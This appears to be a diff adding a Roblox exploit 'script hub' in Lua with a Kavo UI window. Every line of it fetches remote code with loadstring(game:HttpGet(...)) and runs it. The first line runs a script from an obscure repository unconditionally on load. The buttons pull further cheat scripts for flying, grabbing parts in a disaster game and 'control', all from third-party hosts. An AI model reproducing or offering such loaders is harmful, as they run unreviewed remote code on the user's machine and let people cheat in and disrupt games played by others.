@@ -1,0 +1,20 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/5twh2hsf9j-byte/-/1e27252c8e9e05a9dcae2364441af042fb98a75d/main_script.lua"))()
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("西班牙spain脚本", "Synapse")
+local Tab = Window:NewTab("Game Name")
+local Section = Tab:NewSection("给作品点点赞😋")
+
+Section:NewButton("飞", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
+    print("Clicked")
+end)
+
+Section:NewButton("吸东西自然灾害", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/chesslovers69/Super-ring-parts-v6/refs/heads/main/Bylukaslol"))()
+    print("Clicked")
+end)
+
+Section:NewButton("控制脚本全网第一", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://gist.githubusercontent.com/3T3RN4L9/6804bd4f7fcefd534b8e0037e3e845df/raw/79cbad6a40f683dfee0e782f4ab9d55ca7e89882/control%2520beta.lua", true))()
+    print("Clicked")
+end)
